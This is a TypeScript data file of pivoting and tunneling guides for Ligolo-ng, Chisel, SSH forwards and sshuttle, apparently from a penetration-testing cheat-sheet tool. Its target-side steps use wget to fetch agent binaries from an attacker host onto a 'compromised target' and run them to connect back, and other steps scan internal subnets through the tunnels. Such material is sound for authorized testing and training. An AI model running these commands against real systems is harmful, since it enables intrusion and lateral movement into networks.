// Tunneling/Pivoting tool step guides

export interface TunnelingStep {
  id: string;
  title: string;
  description: string;
  command: string;
  side: "attacker" | "target" | "both";
}

export interface TunnelingTool {
  id: string;
  name: string;
  description: string;
  icon: string;
  steps: TunnelingStep[];
}

export const tunnelingTools: TunnelingTool[] = [
  {
    id: "ligolo-ng",
    name: "Ligolo-ng",
    description: "Modern tunneling/pivoting tool with TUN interface support",
    icon: "🔗",
    steps: [
      {
        id: "ligolo-1",
        title: "Start Proxy (Attacker)",
        description: "Start the Ligolo-ng proxy server on your attack machine",
        command: "sudo ip tun add ligolo mode tun && sudo ip link set ligolo up",
        side: "attacker",
      },
      {
        id: "ligolo-2",
        title: "Run Proxy Server",
        description: "Start the proxy to listen for agent connections",
        command: "./proxy -selfcert -laddr 0.0.0.0:11601",
        side: "attacker",
      },
      {
        id: "ligolo-3",
        title: "Upload Agent (Target)",
        description: "Transfer the agent binary to the compromised target",
        command: "wget http://{HOST}:8000/agent -O /tmp/agent && chmod +x /tmp/agent",
        side: "target",
      },
      {
        id: "ligolo-4",
        title: "Run Agent (Target)",
        description: "Execute the agent to connect back to your proxy",
        command: "./agent -connect {HOST}:11601 -ignore-cert",
        side: "target",
      },
      {
        id: "ligolo-5",
        title: "Add Route (Attacker)",
        description: "In the proxy console, select session and add route",
        command: "session\nifconfig\nstart\n# In another terminal:\nsudo ip route add 10.10.10.0/24 dev ligolo",
        side: "attacker",
      },
    ],
  },
  {
    id: "chisel",
    name: "Chisel",
    description: "Fast TCP/UDP tunnel over HTTP with SSH encryption",
    icon: "🔨",
    steps: [
      {
        id: "chisel-1",
        title: "Start Server (Attacker)",
        description: "Start Chisel server on your attack machine",
        command: "chisel server --reverse --port 8000",
        side: "attacker",
      },
      {
        id: "chisel-2",
        title: "Upload Chisel (Target)",
        description: "Transfer chisel binary to the target",
        command: "wget http://{HOST}:8080/chisel -O /tmp/chisel && chmod +x /tmp/chisel",
        side: "target",
      },
      {
        id: "chisel-3",
        title: "Reverse Port Forward",
        description: "Connect from target and create reverse tunnel",
        command: "./chisel client {HOST}:8000 R:socks",
        side: "target",
      },
      {
        id: "chisel-4",
        title: "Configure Proxychains",
        description: "Add SOCKS5 proxy to proxychains.conf",
        command: 'echo "socks5 127.0.0.1 1080" >> /etc/proxychains4.conf',
        side: "attacker",
      },
      {
        id: "chisel-5",
        title: "Use Tunnel",
        description: "Route traffic through the tunnel",
        command: "proxychains4 nmap -sT -Pn 10.10.10.0/24",
        side: "attacker",
      },
    ],
  },
  {
    id: "ssh-local",
    name: "SSH Local Forward",
    description: "Forward a remote port to your local machine",
    icon: "🔐",
    steps: [
      {
        id: "ssh-local-1",
        title: "Local Port Forward",
        description: "Access a remote service through SSH tunnel",
        command: "ssh -L 8080:localhost:80 {USERNAME}@{HOST}",
        side: "attacker",
      },
      {
        id: "ssh-local-2",
        title: "Access Service",
        description: "Now access the remote service locally",
        command: "curl http://localhost:8080",
        side: "attacker",
      },
    ],
  },
  {
    id: "ssh-remote",
    name: "SSH Remote Forward",
    description: "Make a local service accessible on the remote machine",
    icon: "🔐",
    steps: [
      {
        id: "ssh-remote-1",
        title: "Remote Port Forward",
        description: "Expose local port on the remote server",
        command: "ssh -R 9999:localhost:80 {USERNAME}@{HOST}",
        side: "attacker",
      },
      {
        id: "ssh-remote-2",
        title: "Access on Remote",
        description: "Service is now accessible on remote:9999",
        command: "curl http://localhost:9999  # Run on target",
        side: "target",
      },
    ],
  },
  {
    id: "ssh-dynamic",
    name: "SSH Dynamic (SOCKS)",
    description: "Create a SOCKS proxy for dynamic port forwarding",
    icon: "🔐",
    steps: [
      {
        id: "ssh-dyn-1",
        title: "Create SOCKS Proxy",
        description: "Create dynamic port forward (SOCKS proxy)",
        command: "ssh -D 1080 {USERNAME}@{HOST}",
        side: "attacker",
      },
      {
        id: "ssh-dyn-2",
        title: "Configure Proxychains",
        description: "Set up proxychains to use the SOCKS proxy",
        command: 'echo "socks5 127.0.0.1 1080" >> /etc/proxychains4.conf',
        side: "attacker",
      },
      {
        id: "ssh-dyn-3",
        title: "Route Traffic",
        description: "Use proxychains to route traffic through tunnel",
        command: "proxychains4 nmap -sT -Pn {TARGET_IP}",
        side: "attacker",
      },
    ],
  },
  {
    id: "sshuttle",
    name: "SSHuttle",
    description: "Transparent VPN-like tunnel over SSH",
    icon: "🚀",
    steps: [
      {
        id: "sshuttle-1",
        title: "Install SSHuttle",
        description: "Install sshuttle on your attack machine",
        command: "apt install sshuttle",
        side: "attacker",
      },
      {
        id: "sshuttle-2",
        title: "Create VPN Tunnel",
        description: "Tunnel entire subnet through SSH",
        command: "sshuttle -r {USERNAME}@{HOST} 10.10.10.0/24",
        side: "attacker",
      },
      {
        id: "sshuttle-3",
        title: "Access Network",
        description: "Now access internal network directly",
        command: "nmap -sV 10.10.10.100",
        side: "attacker",
      },
    ],
  },
];
